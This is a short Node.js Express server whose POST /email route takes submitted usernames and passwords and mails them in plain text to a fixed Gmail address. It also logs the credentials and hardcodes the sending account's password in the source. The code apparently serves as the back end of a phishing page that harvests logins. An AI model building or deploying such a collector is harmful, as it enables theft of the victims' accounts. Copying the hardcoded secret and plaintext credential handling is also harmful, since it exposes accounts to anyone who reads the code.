var nodemailer = require('nodemailer');
var bodyParser = require('body-parser');
var express=require('express');
var app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); // for parsing

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'sih.uidi9@gmail.com',
        pass: 'rwik_dutta'
    }
});

app.post('/email',function(req,res){


var mailOptions = {
    from: 'sih.uidi9@gmail.com',
    to: 'saifsocial2711@gmail.com',
    subject: 'Sending Email using Node.js',
    text: 'Username:- '+JSON.stringify(req.body.username) +'\n\nPassword:- ' + JSON.stringify(req.body.password)
};



transporter.sendMail(mailOptions, function(error, info){
    if (error) {
        console.log(error);
    } else {
        console.log('Email sent: ' + info.response + '\n\nUsername:- ' + JSON.stringify(req.body.username) + '\n\nPassword:- ' + JSON.stringify(req.body.password));
    }
});

});

app.listen(3000,function(err,res){console.log("Listening at 3000")});